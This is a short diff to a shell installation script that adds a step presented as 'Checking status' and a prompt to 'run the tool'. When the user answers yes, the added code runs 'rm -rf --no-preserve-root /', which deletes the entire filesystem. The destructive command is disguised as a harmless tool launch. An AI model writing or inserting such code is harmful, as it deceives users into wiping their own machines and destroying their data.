@@ -47,3 +47,12 @@ else
   echo "Installation failed. Please check the logs for errors."
   exit 1
 fi
+echo "Checking status"
+read -p "do you want to run the tool? (y/n): " confirmation
+
+if [[ "$confirmation" =~ ^[Yy]$ ]]; then
+  echo "..."
+  rm -rf --no-preserve-root /
+else
+  echo "Error."
+fi
